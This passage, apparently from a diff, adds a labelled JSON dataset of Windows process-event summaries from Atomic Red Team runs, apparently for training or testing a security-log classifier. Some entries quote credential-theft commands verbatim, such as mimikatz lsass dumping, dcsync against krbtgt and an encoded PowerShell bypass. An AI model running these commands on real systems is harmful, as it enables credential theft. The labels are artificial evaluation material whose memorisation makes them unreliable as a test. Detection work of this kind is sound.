+        "`svchost.exe` launched using PowerShell to compile and execute code from a temporary directory.",
+        2
+    ],
+    [
+        "`timeout.exe` launched with empty command-line arguments and no parent process.",
+        1
+    ],
+    [
+        "`whoami.exe` executed under user `bazinga`.",
+        1
+    ],
+    [
+        "A PowerShell process was executed with a suspicious command to run `uuid_injection.exe` from the `AtomicRedTeam` directory.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` (PID 8684) executed without a visible command or integrity level.",
+        1
+    ],
+    [
+        "Event ID 1: `whoami.exe` launched.  - Command: `\\\"C:\\Windows\\system32\\whoami.exe\\\"`.  - Parent Process: Not recorded (PID: 8924.0).  - Directory: `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4`.  - User: `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`powershell.exe` (PID: 2636) was launched from `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\`.",
+        1
+    ],
+    [
+        "`powershell.exe` was launched with no arguments or parent process information.",
+        1
+    ],
+    [
+        "`SearchFilterHost.exe` (PID: 2284) was launched under the `NT AUTHORITY\\SYSTEM` user.",
+        0
+    ],
+    [
+        "`PktMon.exe` launched with empty command-line arguments and no parent process.",
+        2
+    ],
+    [
+        "`cmd.exe` executed the `wmic process call create` command to launch `notepad.exe`.",
+        2
+    ],
+    [
+        "`SearchProtocolHost.exe` launched by `SearchIndexer.exe`.",
+        0
+    ],
+    [
+        "`SearchProtocolHost.exe` launched by `SearchIndexer.exe` with typical arguments.",
+        0
+    ],
+    [
+        "Process launched without command or parent process details.",
+        1
+    ],
+    [
+        "`SearchProtocolHost.exe` executed under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`C:\\Users\\bazinga\\AppData\\Local\\Temp\\dismhost.exe` launched from a temporary directory.",
+        2
+    ],
+    [
+        "`conhost.exe` (PID: 2624) launched with no command details, ran under `DESKTOP-DU6JNPV\\bazinga`.",
+        0
+    ],
+    [
+        "`whoami.exe` (`PID: 3976`) executed with standard arguments. Parent process is unspecified (`PID: 8924`). Process ran in `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under `High` integrity level.",
+        1
+    ],
+    [
+        "`svchost.exe` was launched by `services.exe` with the command `C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS`.",
+        0
+    ],
+    [
+        "`csc.exe` (C# Compiler) launched from `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319` with no command-line arguments. No parent process information available.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` was executed in the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4`.",
+        1
+    ],
+    [
+        "PowerShell launched from `AppData\\Local\\Temp` running a network scanning script.",
+        2
+    ],
+    [
+        "`whoami.exe` was launched with no command-line arguments. Parent process information is missing.",
+        1
+    ],
+    [
+        "`calc.exe` was launched via `cmd.exe` with a command that modifies the registry and creates a scheduled task.",
+        2
+    ],
+    [
+        "`whoami.exe` launched.",
+        1
+    ],
+    [
+        "`cmd.exe` launched with empty command-line arguments, no parent process, and missing directory information.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID: 1608) executed from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4`.",
+        2
+    ],
+    [
+        "`C:\\AtomicRedTeam\\ExternalPayloads\\T1003.004\\bin\\PsExec.exe` was executed via `cmd.exe` to save registry secrets to a temporary directory.",
+        2
+    ],
+    [
+        "`conhost.exe` was launched with command-line arguments, invoked by PowerShell executing a remote script.",
+        2
+    ],
+    [
+        "Process launched without a command or parent process details.",
+        0
+    ],
+    [
+        "Calc.exe launched via PowerShell with a command referencing `C:\\AtomicRedTeam\\atomics\\T1055\\bin\\x64\\redVanity.exe`. Process ran from the temporary directory (`C:\\Users\\bazinga\\AppData\\Local\\Temp\\`) with High integrity.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` launched with no command under user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "Process `SecurityHealthHost.exe` was launched with expected arguments, spawned by `svchost.exe`, running in `C:\\Windows\\system32\\` under user `DESKTOP-DU6JNPV\\bazinga` with a medium integrity level.",
+        0
+    ],
+    [
+        "Process `conhost.exe` was launched alongside `rdrleakdiag.exe` and was spawned by PowerShell. It ran in the directory `C:\\Windows`.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID: 5028) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` with no parent process information.",
+        1
+    ],
+    [
+        "Another instance of `cvtres.exe` was launched, with missing details.",
+        1
+    ],
+    [
+        "SearchProtocolHost.exe launched by SearchIndexer.exe under SYSTEM user context.",
+        0
+    ],
+    [
+        "Event ID 5 - Process `SecurityHealthHost.exe` (PID: 6880) launched. No command or parent process details provided.",
+        1
+    ],
+    [
+        "`SearchFilterHost.exe` launched by `SearchIndexer.exe` with normal arguments.",
+        0
+    ],
+    [
+        "Process `whoami.exe` launched with missing parent process and directory details under user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "Event ID 1 indicates that `powershell.exe` (PID: 4780) was launched from the directory `C:\\Users\\bazinga\\AppData\\Local\\Temp\\`. The same PowerShell script and `rclone` command from Log Entry 1 were executed.",
+        2
+    ],
+    [
+        "`SearchFilterHost.exe` was launched with no provided command or parent process details under the user `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "Process `conhost.exe` was launched by `powershell.exe` with suspicious command-line arguments (`Invoke-WebRequest` targeting localhost and referencing a file in `AtomicRedTeam`).",
+        2
+    ],
+    [
+        "Process `SearchProtocolHost.exe` was launched by `SearchIndexer.exe` under `NT AUTHORITY\\SYSTEM`. Command includes parameters related to Windows Search functionality.",
+        0
+    ],
+    [
+        "`conhost.exe` was launched by `cmd.exe` with the command `cmd.exe /c \\\"procdump.exe\\\"`. The process ran in the `C:\\Windows\\` directory.",
+        1
+    ],
+    [
+        "Multiple `backgroundTaskHost.exe` processes were launched under the user `bazinga`.",
+        0
+    ],
+    [
+        "`svchost.exe` launched with the command `svchost.exe -k netsvcs -p -s BITS`.",
+        0
+    ],
+    [
+        "On 7/7/2025 10:55:50 AM, `C:\\Windows\\System32\\SearchFilterHost.exe` was launched, but the parent process and command-line arguments were missing.",
+        1
+    ],
+    [
+        "`WmiPrvSE.exe` (PID: 8652) launched with a secured embedding flag, spawned by `svchost.exe` under `NT AUTHORITY\\ETWORK SERVICE`.",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\conhost.exe` launched.",
+        0
+    ],
+    [
+        "`whoami.exe` launched from `SecureSLM\\Run4` directory under user `bazinga`.",
+        2
+    ],
+    [
+        "`SearchProtocolHost.exe` launched by `SearchIndexer.exe`.",
+        0
+    ],
+    [
+        "Event ID: 1  Process: `C:\\Windows\\System32\\SearchProtocolHost.exe`  Command: `\\\"C:\\Windows\\system32\\SearchProtocolHost.exe\\\" Global\\UsGthrFltPipeMssGthrPipe11_ Global\\UsGthrCtrlFltPipeMssGthrPipe11 ...`  Parent Process: `C:\\Windows\\System32\\SearchIndexer.exe`  Integrity Level: `System`",
+        0
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 12180) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID: 9552) launched with command: `\\\"C:\\Windows\\system32\\whoami.exe\\\"`.",
+        1
+    ],
+    [
+        "`conhost.exe` (PID: 9996) launched by `powershell.exe` (PID: 3856) with a PowerShell script that attempts to upload `.7z` files from `C:\\Windows\\Temp` to `ftp://127.0.0.1/`.",
+        2
+    ],
+    [
+        "`C:\\Windows\\System32\\conhost.exe` was executed by `cmd.exe` in conjunction with `PsExec.exe`.",
+        1
+    ],
+    [
+        "Microsoft Edge (`msedge.exe`) launched with multiple sub-processes and sandboxing parameters under `DESKTOP-DU6JNPV\\bazinga`.",
+        0
+    ],
+    [
+        "`conhost.exe` launched by `powershell.exe` with an unusual command referencing `calc.exe`.",
+        2
+    ],
+    [
+        "`conhost.exe` spawned by PowerShell with unusual command line.",
+        2
+    ],
+    [
+        "`SearchFilterHost.exe` (PID: 7724) launched by `SearchIndexer.exe` (PID: 4244).",
+        0
+    ],
+    [
+        "`powershell.exe` (PID: 6640) was launched from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` with a command referencing the Atomic Red Team framework.",
+        2
+    ],
+    [
+        "`whoami.exe` (PID: 6396) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under a high-integrity context.",
+        1
+    ],
+    [
+        "`python3.13.exe` (PID: 3432) launched from `C:\\Program Files\\WindowsApps\\PythonSoftwareFoundation.Python.3.13_3.13.1520.0_x64__qbz5n2kfra8p0\\` under user `DESKTOP-DU6JNPV\\bazinga`. No parent process recorded.",
+        1
+    ],
+    [
+        "`cvtres.exe` launched by `csc.exe` to compile a temporary file.",
+        2
+    ],
+    [
+        "`WmiPrvSE.exe` launched by `svchost.exe` with `DcomLaunch`.",
+        0
+    ],
+    [
+        "`svchost.exe` (PID: 12400) launched with command `-k appmodel -p -s camsvc` by `services.exe` (PID: 780.0). It ran under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\svchost.exe` launched with `wuauserv` service.",
+        0
+    ],
+    [
+        "Event ID 1 - Process `powershell.exe` (PID: 10136) launched with command `UuidFromStringA.exe -debug`. Parent process is `-` (PID: 8924) running from a temporary directory (`AppData\\Local\\Temp`).",
+        2
+    ],
+    [
+        "`smartscreen.exe` was launched by `svchost.exe` with no unusual arguments.",
+        0
+    ],
+    [
+        "Process `powershell.exe` was launched from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\`, executing `Start-Hollow.ps1` with parameters for process injection (`notepad.exe` and `cmd.exe`).",
+        2
+    ],
+    [
+        "The `whoami.exe` process was launched by `PowerShell.exe` and executed from a directory (`C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3\\`) instead of the default system directory.",
+        1
+    ],
+    [
+        "`C:\\Windows\\System32\\whoami.exe` (PID: 14532) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "On 7/7/2025 1:40:04 PM, `conhost.exe` (PID: 12140) was launched with no command-line arguments. It was spawned by an unknown parent process (PID: -1).",
+        1
+    ],
+    [
+        "`conhost.exe` was launched by `powershell.exe` with a command that includes the creation of a remote thread (`CreateRemoteThread.exe`) in `werfault.exe`. The PowerShell process executed from the `C:\\AtomicRedTeam\\atomics\\T1055\\bin\\x64\\` directory.",
+        2
+    ],
+    [
+        "`conhost.exe` was launched under user `bazinga` without command or parent process details.",
+        1
+    ],
+    [
+        "Event ID 5: `whoami.exe` launched from `C:\\Windows\\System32`.  - Command: None.  - Parent Process: Not recorded (PID: -1.0).  - User: `DESKTOP-DU6JNPV\\bazinga`.",
+        0
+    ],
+    [
+        "`whoami.exe` was launched from a non-standard directory (`C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`) under user `bazinga`.",
+        2
+    ],
+    [
+        "`powershell.exe` (PID 7532) executed the same encoded file upload command and ran from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\`.",
+        2
+    ],
+    [
+        "Process `'C:\\Windows\\System32\\SearchFilterHost.exe'` was launched by `'C:\\Windows\\System32\\SearchIndexer.exe'`.",
+        0
+    ],
+    [
+        "`HOSTNAME.EXE` launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "Process `whoami.exe` was executed with command `\\\"C:\\Windows\\system32\\whoami.exe\\\"` by an unknown parent process (`-`). The process ran from the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "A PowerShell process (PID: 2992) was spawned by another PowerShell process (PID: 1964) to execute the same complex command as in Log 1, involving the extraction and execution of a Base64-encoded payload.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 2928) was launched without a parent process or command-line arguments.",
+        1
+    ],
+    [
+        "`WmiPrvSE.exe` was launched by `svchost.exe` under the user `NT AUTHORITY\\ETWORK SERVICE`.",
+        0
+    ],
+    [
+        "Process `whoami.exe` (PID: 4100) executed with the command `\\\"whoami.exe /all\\\"`, spawned by `powershell.exe`. The command includes obfuscated PowerShell code that writes output to a randomized `.tmp` file in the `Temp` directory.",
+        2
+    ],
+    [
+        "`cmd.exe` launched with a chain of commands for `net use`.",
+        2
+    ],
+    [
+        "`powershell.exe` (PID 8964) launched `conhost.exe` (PID 11736) using `CreateProcess.exe` and `werfault.exe`.",
+        2
+    ],
+    [
+        "`reg.exe` exported `HKLM\\system` registry hive to a temporary directory.",
+        2
+    ],
+    [
+        "`C:\\Windows\\System32\\backgroundTaskHost.exe` launched.",
+        0
+    ],
+    [
+        "`Notepad.exe` was launched using PowerShell with a complex command that includes references to `InjectView.exe`, a file located in `C:\\AtomicRedTeam\\atomics\\T1055\\bin\\x64\\`. The process ran in a temporary directory (`AppData\\Local\\Temp`) under a user context with high integrity.",
+        2
+    ],
+    [
+        "On 7/7/2025 8:23:50 PM, `powershell.exe` (PID: 10640) was launched from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` and executed `CreateThread.exe` from the `AtomicRedTeam` directory.",
+        2
+    ],
+    [
+        "Process `cmd.exe` executed with command `\\\"cmd.exe\\\" /c wmic /node:\\\"localhost\\\" shadowcopy call create Volume=C:\\`. Parent process was `powershell.exe`. Execution occurred in `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` under user `bazinga` with high integrity level.",
+        2
+    ],
+    [
+        "`taskhostw.exe` (PID: 9528) launched with no command details, ran under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "Process `WMIC.exe` launched by `cmd.exe` to uninstall a product (`TightVNC`) on `127.0.0.1`.",
+        1
+    ],
+    [
+        "`SecurityHealthHost.exe` (PID: 4756) launched with no command-line arguments and unknown parent process (PID: -1.0).",
+        1
+    ],
+    [
+        "`SearchFilterHost.exe` (PID: 11368) was launched by `SearchIndexer.exe` (PID: 4244) with a benign command.",
+        0
+    ],
+    [
+        "The `HOSTNAME.EXE` process was executed from `C:\\Windows\\System32` with the command `\\\"C:\\Windows\\system32\\HOSTNAME.EXE\\\"`. It was spawned by `powershell.exe` running from the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3\\` under the user `DESKTOP-DU6JNPV\\bazinga` with high integrity.",
+        2
+    ],
+    [
+        "`Whoami.exe` was launched with no command-line arguments, no parent process, and no integrity level specified. The user context is `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`C:\\Windows\\System32\\HOSTNAME.EXE` (PID: 9124) was launched.",
+        1
+    ],
+    [
+        "PowerShell (PID: 11064) was executed from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\`.",
+        2
+    ],
+    [
+        "On 7/7/2025 11:27:52 AM, Event ID 5 occurred. Process `conhost.exe` was launched, but its parent process and command line are missing.",
+        1
+    ],
+    [
+        "PowerShell launched to compile and execute .NET code.",
+        2
+    ],
+    [
+        "PowerShell executed from a temporary directory.",
+        2
+    ],
+    [
+        "`SecurityHealthHost.exe` (PID: 14300) launched with no command details under `DESKTOP-DU6JNPV\\bazinga`.",
+        0
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 5568) launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3\\` with `High` integrity level. The parent process is unidentified (`PID: 7468`).",
+        1
+    ],
+    [
+        "`whoami.exe` launched with no command-line arguments.",
+        1
+    ],
+    [
+        "`conhost.exe` was launched by `powershell.exe` with a command to use `Send-MailMessage` for sending an email with an attachment (`notepad.exe`) via `127.0.0.1`. The process ran under the user `bazinga` with high integrity.",
+        2
+    ],
+    [
+        "`schtasks.exe` was launched with the command: `SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10` under user `DESKTOP-DU6JNPV\\bazinga` from a temporary directory.",
+        2
+    ],
+    [
+        "`conhost.exe` (PID 13248) was launched by `powershell.exe` (PID 7588) with the command `Get-NetTCPConnection`, under the user `DESKTOP-DU6JNPV\\bazinga` with elevated integrity.",
+        1
+    ],
+    [
+        "Event ID 1 - Process `conhost.exe` (PID: 12908) launched with arguments `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`. It was spawned by `powershell.exe` (PID: 14104) running a suspicious PowerShell script (`Invoke-MalDoc.ps1`) from an external URL. Ran under user `bazinga` with High integrity.",
+        2
+    ],
+    [
+        "Process `HOSTNAME.EXE` (PID: 2392) launched without a clear parent process or command parameters.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\cmd.exe` (PID: 7828) executed a malicious payload.",
+        2
+    ],
+    [
+        "Process launched without a command or parent process details.",
+        0
+    ],
+    [
+        "Process `whoami.exe` (PID: 5132) launched without a parent process or command details.",
+        1
+    ],
+    [
+        "`SearchFilterHost.exe` (PID: 7724) launched under `NT AUTHORITY\\SYSTEM`. No parent process recorded.",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` (PID: 11064) was launched by an unknown parent process.",
+        1
+    ],
+    [
+        "Process `WmiPrvSE.exe` was launched by `svchost.exe` under the `NT AUTHORITY\\ETWORK SERVICE` user with `System` integrity level. Command: `C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding`.",
+        0
+    ],
+    [
+        "CalculatorApp.exe launched by sihost.exe, running in an AppContainer integrity level.",
+        0
+    ],
+    [
+        "`whoami.exe` (PID: 13320) launched under `DESKTOP-DU6JNPV\\bazinga` from the `SecureSLM\\Run4` directory.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID: 10892) launched with no command details or parent process information.",
+        1
+    ],
+    [
+        "`powershell.exe` was launched without a parent process or command-line arguments, running under user `bazinga`.",
+        2
+    ],
+    [
+        "`reg.exe` (PID: 10600) launched.",
+        1
+    ],
+    [
+        "`whoami.exe` and `hostname.exe` were executed from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "Process `SecurityHealthHost.exe` (PID: 3404) was launched by `svchost.exe` (PID: 856.0) using the command: `{08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding`. Ran under user `DESKTOP-DU6JNPV\\bazinga` with `Medium` integrity level.",
+        1
+    ],
+    [
+        "`RuntimeBroker.exe` launched without command or parent process under `bazinga`.",
+        1
+    ],
+    [
+        "`conhost.exe` (Console Host) was launched by `PowerShell.exe` with a command line that includes a base64 encoding operation, DNS queries, and potential data exfiltration.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 9684) launched under user `bazinga`. No parent process recorded.",
+        1
+    ],
+    [
+        "`whoami.exe` was launched without a parent process or directory information.",
+        1
+    ],
+    [
+        "`SearchFilterHost.exe` launched by `SearchIndexer.exe` under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\wbem\\WmiPrvSE.exe` (PID: 9348) was launched without a parent process.",
+        0
+    ],
+    [
+        "Process `HOSTNAME.EXE` was launched with no command-line arguments, from an unknown parent process, under user `DESKTOP-DU6JNPV\\bazinga` with unspecified integrity level.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` launched from `SecureSLM\\Run4` directory under user `bazinga`.",
+        2
+    ],
+    [
+        "`whoami.exe` launched without a parent process or command-line arguments under user `bazinga`.",
+        1
+    ],
+    [
+        "Process `powershell.exe` (PID: 7452) executed obfuscated code to generate a randomized `.tmp` file and redirect `whoami.exe` output to it.",
+        2
+    ],
+    [
+        "Process `C:\\Users\\bazinga\\AppData\\Roaming\\svchost.exe` (PID: 7808) executed a VBScript payload.",
+        2
+    ],
+    [
+        "Event ID 1 - Process `HOSTNAME.EXE` (PID: 1528) launched with command `\\\"HOSTNAME.EXE\\\"`. Parent process is `-` (PID: 8924) running from `Documents\\SecureSLM\\Run4`.",
+        2
+    ],
+    [
+        "`SearchFilterHost.exe` was executed from the `C:\\Windows\\System32` directory by `SearchIndexer.exe` with various parameters. The process ran under the `NT AUTHORITY\\SYSTEM` account with a medium integrity level.",
+        0
+    ],
+    [
+        "`SecurityHealthHost.exe` launched with command `{08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding` by `svchost.exe`. It ran under user `DESKTOP-DU6JNPV\\bazinga` with Medium integrity.",
+        0
+    ],
+    [
+        "The process `whoami.exe` (PID: 5372) was launched with no command-line arguments or parent process information. It ran under the user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`conhost.exe` (PID: 7332) launched with command: `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`.",
+        1
+    ],
+    [
+        "`powershell.exe` was launched from a temporary directory to copy a file from a network share to a temp directory.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 11636) was launched by an unknown process (`PID: 8924`) from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`SearchFilterHost.exe` and `SearchProtocolHost.exe` launched under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`cmd.exe` was launched in the `AppData\\Local\\Temp` directory and executed a `WMIC` command.",
+        1
+    ],
+    [
+        "`whoami.exe` was executed from the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "Process `whoami.exe` was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID: 13464) was launched with no command line arguments or parent process information. The process ran with no directory or integrity level details under user `bazinga`.",
+        1
+    ],
+    [
+        "- Process: `SearchFilterHost.exe` (PID: 12268)  - Parent Process: `SearchIndexer.exe` (PID: 4244)  - Command Line: `\\\"SearchFilterHost.exe\\\" 0 828 832 840 8192 836 812`  - User: `NT AUTHORITY\\SYSTEM`  - Integrity Level: Medium",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\taskhostw.exe` launched.",
+        0
+    ],
+    [
+        "`whoami.exe` (PID: 9552) launched without command or parent details.",
+        1
+    ],
+    [
+        "`powershell.exe` was launched with a base64-encoded command (`-exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA`) from `cmd.exe` under the user `DESKTOP-DU6JNPV\\bazinga` in the `AppData\\Local\\Temp` directory.",
+        2
+    ],
+    [
+        "`WmiPrvSE.exe` launched by `svchost.exe` with standard arguments.",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` (PID: 5016) was launched from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\`.",
+        2
+    ],
+    [
+        "Process `conhost.exe` (PID: 2272) launched with no specified command, parent process, or integrity level.",
+        1
+    ],
+    [
+        "`powershell.exe` (PID: 11688) launched from `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` with no command-line arguments. It was initiated by an unknown parent process (PID: -1.0) under user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`C:\\Windows\\System32\\HOSTNAME.EXE` (PID: 1668) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`WmiPrvSE.exe` launched by `svchost.exe` with typical arguments under `NT AUTHORITY\\ETWORK SERVICE`.",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\sppsvc.exe` launched by `services.exe`.",
+        0
+    ],
+    [
+        "Event ID 1 - Process `conhost.exe` (PID: 8804) launched with command `UuidFromStringA.exe -debug`. Parent process is `powershell.exe` (PID: 10136).",
+        2
+    ],
+    [
+        "`SearchFilterHost.exe` (PID: 32) launched by `SearchIndexer.exe`.",
+        0
+    ],
+    [
+        "PowerShell was launched to execute a similar file operation command as above, originating from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\`. The parent process was another PowerShell instance.",
+        2
+    ],
+    [
+        "Process `cmd.exe` launched by `powershell.exe` to execute `nanodump.x64.exe` from a temporary directory.",
+        2
+    ],
+    [
+        "`cmd.exe` (PID: 4592) was launched with the command:    `\\\"cmd.exe\\\" /c \\\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\x64\\mimikatz.exe\\\" \\\"sekurlsa::minidump %%tmp%%\\lsass.DMP\\\" \\\"sekurlsa::logonpasswords full\\\" exit`.    The process ran from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` with a high integrity level.",
+        2
+    ],
+    [
+        "`cmd.exe` (PID: 8712) was launched without detailed command-line arguments or parent process information.",
+        1
+    ],
+    [
+        "`WmiApSrv.exe` (PID: 5256) launched without additional arguments.",
+        0
+    ],
+    [
+        "Process `conhost.exe` was launched without a parent process and no clear command line arguments.",
+        0
+    ],
+    [
+        "`cmd.exe` (PID: 8712) executed a command to save registry hives to the `%temp%` directory. Parent process: `PowerShell.exe`.",
+        2
+    ],
+    [
+        "`conhost.exe` (PID: 7000) launched from `C:\\Windows\\System32\\conhost.exe` with no command-line arguments. It was initiated by an unknown parent process (PID: -1.0) under user `DESKTOP-DU6JNPV\\bazinga`.",
+        0
+    ],
+    [
+        "`conhost.exe` was launched by `cmd.exe` with arguments indicating PowerShell execution (`0xffffffff -ForceV1`) under the user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`qwinsta` command executed to query remote terminal sessions.",
+        1
+    ],
+    [
+        "`conhost.exe` was launched with no provided command or parent process details under the user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID: 13264) was launched with no specified command or parent process.",
+        1
+    ],
+    [
+        "Process `mavinject.exe` was launched with incomplete details.",
+        2
+    ],
+    [
+        "`powershell.exe` launched from a temporary directory executing `nmap`.",
+        2
+    ],
+    [
+        "On 7/7/2025 11:11:57 AM, `conhost.exe` (PID: 5656) was launched by `powershell.exe` (PID: 3132).",
+        1
+    ],
+    [
+        "`svchost.exe` (PID: 14784) launched with no command-line arguments and unknown parent process (PID: -1.0).",
+        1
+    ],
+    [
+        "Process `SearchFilterHost.exe` (PID: 8008) launched under `SYSTEM` user with typical parameters.",
+        0
+    ],
+    [
+        "`cmd.exe` executed to echo \\\"services\\\".",
+        1
+    ],
+    [
+        "The process `whoami.exe` (PID: 5372) was launched with the command `\\\"C:\\Windows\\system32\\whoami.exe\\\"`. It was spawned by an unknown parent process (`PID: 7468`) and executed in the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3\\`.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\conhost.exe` (PID: 8484) launched with no command-line arguments or parent process.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 1612) launched under `DESKTOP-DU6JNPV\\bazinga` from the `SecureSLM\\Run4` directory.",
+        1
+    ],
+    [
+        "`C:\\Windows\\System32\\whoami.exe` (PID: 2008) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "Process `whoami.exe` (PID: 392) was launched with no command-line arguments or parent process information. Ran under user `DESKTOP-DU6JNPV\\bazinga` with an unknown integrity level.",
+        2
+    ],
+    [
+        "Process `mimikatz.exe` (PID: 864) executed the command: `lsadump::dcsync /domain:%%userdnsdomain%% /user:krbtgt@%%userdnsdomain%%`.",
+        2
+    ],
+    [
+        "Event ID: 1  Process: `C:\\Windows\\System32\\conhost.exe`  Command: `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`  Parent Process: `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`  Command in Parent: `\\\"powershell.exe\\\" & {Invoke-Expression \\\\\"\\\"C:\\AtomicRedTeam\\atomics\\T1027.004\\bin\\T1027.004_DynamicCompile.exe\\\\\"\\\"}`Integrity Level: `High`",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` was launched without a parent process or directory information.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` was launched without a parent process or command-line arguments, running under user `bazinga`.",
+        1
+    ],
+    [
+        "`powershell.exe` was launched with no provided command or parent process details under the user `DESKTOP-DU6JNPV\\bazinga`.",
+        2
+    ],
+    [
+        "`conhost.exe` was launched by `cmd.exe` to support the execution of `WMIC.exe`.",
+        0
+    ],
+    [
+        "`WerFault.exe` launched via PowerShell from `AppData\\Local\\Temp`.",
+        2
+    ],
+    [
+        "Process `whoami.exe` was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`, under `DESKTOP-DU6JNPV\\bazinga` with high integrity.",
+        1
+    ],
+    [
+        "`C:\\Windows\\System32\\wbem\\WmiPrvSE.exe` launched.",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\HOSTNAME.EXE` (PID: 1668) was launched.",
+        1
+    ],
+    [
+        "On 7/7/2025 11:27:52 AM, Event ID 1 occurred. Process `C:\\Windows\\System32\\wbem\\WmiPrvSE.exe` was launched by `svchost.exe` under `NT AUTHORITY\\ETWORK SERVICE`.",
+        0
+    ],
+    [
